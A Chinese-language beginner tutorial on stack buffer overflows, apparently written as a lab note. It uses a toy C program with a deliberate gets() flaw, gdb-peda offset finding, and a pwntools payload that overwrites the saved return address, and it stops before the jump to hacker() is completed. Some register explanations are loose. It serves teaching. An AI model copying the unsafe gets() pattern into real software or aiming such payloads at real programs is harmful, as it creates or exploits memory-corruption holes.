Overflow
===

### 什麼是Buffer Overflow
  在執行程式時，電腦會先幫忙把需要用到的memory作宣告，例如char s[64]，會先宣告(64+x)bytes(電腦會宣告比原先的再多一點空間)。那在空間都宣告
  完後，會得到rbp、rsp、rip(64bit)這三個重要的暫存器資訊，rbp是執行程式前的base adress,rsp是執行完程式的end adress，rip是下一個要執行函
  式的adress，以圖表表示的話會如下圖  
  ![image](https://user-images.githubusercontent.com/67756786/199140933-9abe7740-7e38-4454-bc46-97b382886bb8.png)  
  那我們使用Overflow基本上就是找到rip的adress並且將他改為我們所需要的adress，如下圖  
  ![image](https://user-images.githubusercontent.com/67756786/199141227-b8f8d5b7-4bf1-46e6-8c17-4380403b4d97.png)  
  現在開始簡單的實作，首先我們的程式碼是  
  ```c
  #include <stdio.h>
  void hacker()
  {
      printf("No, I'm a hacker!\n");
  }
  void myname()
  {
      char name[16];
      printf("What's your name?\n");
      gets(name);
      printf("Hey %s, nice to meet you?\n", name);
  }
  int main()
  {
      myname();
      return 0;
  }
  ```
  正常執行結果如下圖  
  ![image](https://user-images.githubusercontent.com/67756786/199141859-0324e388-84f8-411f-8a5e-5442b82d6be1.png)  
  我使用的是gdb peda(https://github.com/longld/peda) ，首先先建立一個長字串來找出rbp~rip之間的offset，我是使用peda中的pattern create
  `pattern create 100 p`，這指令是建立起100的字母的一個payload，然後檔名是p，那現在將payload輸入進去`r < p`，接著會看到一堆暫存器的數字
  那我們先不管，簡單的找出能壓到rip的offset即可，可以使用`pattern search`來看  
  ![image](https://user-images.githubusercontent.com/67756786/199143167-50163a12-ae02-4217-999b-5f6465ab24d3.png)  
  那目前可以知道我們壓到eip的offset是24bytes，可以來做個簡單的小測試  
  ```python
  from pwn import *

  padding = "A"*24  ##從rbp壓到rsp的offset
  rip = "BBBBCCCC"  ##預期rip會是BBBBCCCC

  payload = padding + rip

  print(payload)
  ```
  那將python執行結果儲存起來，並且執行，可以看到rip變成BBBBCCCC，那代表我們的padding沒問題  
  ```
  gdb-peda$ i f    ##i f == info frame
Stack level 0, frame at 0x7fffffffe378:
 rip = 0x5555555546f7 in myname; saved rip = *0x4343434342424242* 這是hex的BBBBCCCC
 called by frame at 0x7fffffffe388
 Arglist at 0x4141414141414141, args:
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe380
 Saved registers:
  rip at 0x7fffffffe378
  ```
  那我們預期執行hacker這個函式，首先會找到hacker的adress，`print& hacker`  
  ![image](https://user-images.githubusercontent.com/67756786/199145281-113ddc44-2acd-4148-a538-d6b64c22567e.png)
